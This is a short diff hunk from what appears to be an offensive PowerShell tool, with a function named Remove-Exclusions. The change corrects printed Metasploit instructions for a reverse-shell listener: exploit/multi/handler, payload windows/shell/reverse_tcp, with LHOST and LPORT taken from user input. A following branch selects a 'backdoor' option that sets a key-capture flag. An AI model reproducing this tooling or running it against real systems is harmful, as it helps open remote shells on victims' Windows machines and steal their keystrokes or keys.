@@ -437,8 +437,8 @@ function Remove-Exclusions {
         $metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
         Write-host "[?] $txt65" -NoNewLine -ForegroundColor Gray ; $metahost = $Host.UI.ReadLine() ; Write-Host
         Write-host "[?] $txt43" -NoNewLine -ForegroundColor Gray ; $metaport = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Write-Host ; Write-Host "[!] $txt63" -ForegroundColor Red ; Write-Host ; Write-host "use use exploit/multi/handler"
-        Write-host "set payload windows/shell/reverse_tcp" ; Write-host "set SRVHOST $metahost" ; Write-host "set LPORT $metaport"  
+        Write-Host ; Write-Host "[!] $txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/handler"
+        Write-host "set payload windows/shell/reverse_tcp" ; Write-host "set LHOST $metahost" ; Write-host "set LPORT $metaport"  
         Write-host "exploit" ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 2000 }
 
         if($backdoor -like '3') { $getkeys = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
